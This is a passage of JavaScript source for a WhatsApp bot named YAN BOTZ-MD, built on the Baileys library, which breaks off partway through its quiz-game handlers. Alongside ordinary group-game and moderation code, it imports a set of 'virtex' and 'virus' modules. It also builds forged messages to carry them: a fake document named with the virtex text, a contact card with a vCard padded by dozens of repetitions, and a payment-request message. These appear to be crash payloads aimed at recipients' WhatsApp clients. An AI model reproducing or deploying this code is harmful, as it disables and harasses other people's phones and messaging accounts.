
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { intro } = require('./lib/intro')
const { entri } = require('./lib/entri')
const { buttonfour } = require('./src/virtex/buttonfour')
const { virusv1 } = require('./src/virtex/virusv1')
const { virusv3 } = require('./src/virtex/virusv3')
const { iphone } = require('./src/virtex/iphone')
const { philips } = require('./src/virtex/philips')
const { ngazap } = require('./src/virtex/ngazap')
const { virusloc } = require('./src/virtex/virusloc')
const { viruskon } = require('./src/virtex/viruskon')
const { four } = require('./src/virtex/four')
const { thejo } = require('./src/virtex/thejo')
const { jobot } = require('./src/virtex/jobot')
const { jobot2 } = require('./src/virtex/jobot2')
const { jobot3 } = require('./src/virtex/jobot3')
const { virtex1 } = require('./src/virtex/virtex1')
const { virtex2 } = require('./src/virtex/virtex2')
const { virtex3 } = require('./src/virtex/virtex3')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
virgam = fs.readFileSync(`./src/gambar/virgam yg ganas.jpeg`)

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const banned = JSON.parse(fs.readFileSync('./lib/banned.json'))
const { color, bgcolor } = require('./lib/color')
module.exports = jobotz = async (jobotz, m, chatUpdate, store) => {
await jobotz.readMessages([m.key])

    try {
    //console.log(nomerOwner)
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const isGroup = body.endsWith('@g.us')
        const sender = isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0] 
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await jobotz.decodeJid(jobotz.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const isBan = banned.includes(m.sender)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const from = mek.key.remoteJid
	
        // Group
        const groupMetadata = m.isGroup ? await jobotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const welcm = m.isGroup ? wlcm.includes(from) : true
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const forward = {forwardingScore: 10, isForwarded: true, sendEphemeral: true}
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

const On =`ᴏɴ`
const Off =`ᴏғғ`

let options1 = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"contextInfo": {
"externalAdReply": {
"title": `© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}}

const fdocjo = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${thejo}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const fgamjo = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${thejo}`, 
"jpegThumbnail": virgam
} 
}, quoted: options1
}

const fsticjo = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"jpegThumbnail": virgam,
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}}}

const fkonjo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© YAN BOTZ-MD\n${thejo}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:YAN BOTZ-MD\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}

const jancok = (teks) => {
jobotz.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}

const repjo = (teks) => {
return jobotz.sendMessage(m.chat, { image: thumb, 
"contextInfo": {
"externalAdReply": {
"title": `${wm}`,
"body":`${wm}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}},caption: teks}, {quoted: fkonjo, contextInfo:{}})
}

const buttonjo = (teks) => {
jobotz.sendMessage(m.chat, {
text: teks, 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

// Function
wm = '© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃'
captijo = `${thejo}`
jumlah = `${encodeURI(q)}`
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
let cekno = await jobotz.onWhatsApp(tosend)


// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

	
	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }

        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!jobotz.public) {
            if (!m.key.fromMe) return
        }

//console 
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
    // vn reply
    var vnAdmin = (hehe) => {
   vnnya = fs.readFileSync(`./src/vn/lu siapa anjir.mp3`)
   jobotz.sendMessage(m.chat, {audio: vnnya, mimetype: 'audio/mpeg', ptt:true })
   }
    var vnCreator = (hehe) => {
   vnc = fs.readFileSync(`./src/vn/ga mau.mp3`)
   jobotz.sendMessage(m.chat, {audio: vnc, mimetype: 'audio/mp3', ptt:true })
   }
  

	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await jobotz.setStatus(`${jobotz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        repjo(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick..!!`)
        if (!isBotAdmins) return repjo(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await jobotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return repjo(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return repjo(`Ehh maaf kamu admin`)
        if (isCreator) return repjo(`Ehh maaf kamu owner bot ku`)
        jobotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: jobotz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, jobotz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        jobotz.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            jobotz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await repjo(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
